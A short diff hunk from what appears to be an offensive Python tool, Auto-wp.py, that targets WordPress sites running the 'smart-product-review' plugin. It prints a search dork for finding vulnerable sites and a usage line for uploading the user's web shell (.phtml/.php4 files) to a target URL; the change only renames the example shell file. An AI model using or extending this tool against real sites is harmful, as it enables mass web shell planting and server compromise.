@@ -17,7 +17,7 @@ print("\033[1;34;40mDork:inurl:/wp-content/plugins/smart-product-review/\n")
 
 def usage():
 	print("\033[1;34;40mUsage: python3 Auto-wp.py [target url] [your shell]\n")
-	print("\033[1;34;40mEx: python3 Auto-wp.py https://example.com cks.phtml/cks.php4\n")
+	print("\033[1;34;40mEx: python3 Auto-wp.py https://example.com trkn.phtml/trkn.php4\n")
 
 def vuln_check(uri):
 	response = requests.get(uri)
